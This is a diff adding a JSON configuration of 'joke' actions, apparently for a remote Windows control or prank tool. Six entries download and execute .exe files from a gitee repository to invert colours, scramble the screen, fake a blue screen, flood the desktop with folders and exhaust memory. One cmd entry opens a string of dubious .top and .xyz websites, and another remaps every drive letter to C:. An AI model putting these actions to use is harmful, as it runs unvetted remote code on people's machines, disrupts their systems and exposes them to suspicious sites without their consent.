@@ -1,0 +1,138 @@
+[
+    {
+        "Name": "反色",
+        "Action": [
+            {
+                "ActionName": "downloadAndExecute",
+                "Paras": [
+                    {
+                        "ParaName": "url",
+                        "value": "https://gitee.com/lmx12330/window-op/raw/master/resource/expand/joke/ReversalColor.exe"
+                    },
+                    {
+                        "ParaName": "fileType",
+                        "value": "exe"
+                    }
+                ]
+            }
+        ]
+    },    
+    {
+        "Name": "屏幕混乱",
+        "Action": [
+            {
+                "ActionName": "downloadAndExecute",
+                "Paras": [
+                    {
+                        "ParaName": "url",
+                        "value": "https://gitee.com/lmx12330/window-op/raw/master/resource/expand/joke/HashScreen.exe"
+                    },
+                    {
+                        "ParaName": "fileType",
+                        "value": "exe"
+                    }
+                ]
+            }
+        ]
+    },
+    {
+        "Name": "花屏",
+        "Action": [
+            {
+                "ActionName": "downloadAndExecute",
+                "Paras": [
+                    {
+                        "ParaName": "url",
+                        "value": "https://gitee.com/lmx12330/window-op/raw/master/resource/expand/joke/ColorfulScreen.exe"
+                    },
+                    {
+                        "ParaName": "fileType",
+                        "value": "exe"
+                    }
+                ]
+            }
+        ]
+    },
+    {
+        "Name": "蓝屏",
+        "Action": [
+            {
+                "ActionName": "downloadAndExecute",
+                "Paras": [
+                    {
+                        "ParaName": "url",
+                        "value": "https://gitee.com/lmx12330/window-op/raw/master/resource/expand/joke/BlueScreen.exe"
+                    },
+                    {
+                        "ParaName": "fileType",
+                        "value": "exe"
+                    }
+                ]
+            }
+        ]
+    },
+    {
+        "Name": "传奇全家桶",
+        "Action": [
+            {
+                "ActionName": "cmd",
+                "Paras": [
+                    {
+                        "ParaName": "command",
+                        "value": "start http://tfzotcjtnzxuglsdsm.top:28888/qhcm/ & start http://y5003.9kk99k.xyz:88/ & start https://www.zjwubei.com:520/ & start http://www.jv32.com/ & start http://cxss.288em.com:11620/ & start http://bintattnhodtonpyzwo.top:30303/mjsg/ & start https://20241123.31qy.com/"
+                    }
+                ]
+            }
+        ]
+    },
+    {
+        "Name": "桌面挤满文件夹",
+        "Action": [
+            {
+                "ActionName": "downloadAndExecute",
+                "Paras": [
+                    {
+                        "ParaName": "url",
+                        "value": "https://gitee.com/lmx12330/window-op/raw/master/resource/expand/joke/mkdir.exe"
+                    },
+                    {
+                        "ParaName": "fileType",
+                        "value": "exe"
+                    }
+                ]
+            }
+        ]
+    },
+    {
+        "Name": "卡爆内存",
+        "Action": [
+            {
+                "ActionName": "downloadAndExecute",
+                "Paras": [
+                    {
+                        "ParaName": "url",
+                        "value": "https://gitee.com/lmx12330/window-op/raw/master/resource/expand/joke/malloc.exe"
+                    },
+                    {
+                        "ParaName": "fileType",
+                        "value": "exe"
+                    }
+                ]
+            }
+        ]
+    },
+    {
+        "Name": "插入Z盘",
+        "Action": [
+            {
+                "ActionName": "cmd",
+                "Paras": [
+                    {
+                        "ParaName": "command",
+                        "value": "for %i in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do subst  %i: C:/"
+                    }
+                ]
+            }
+        ]
+    }
+]
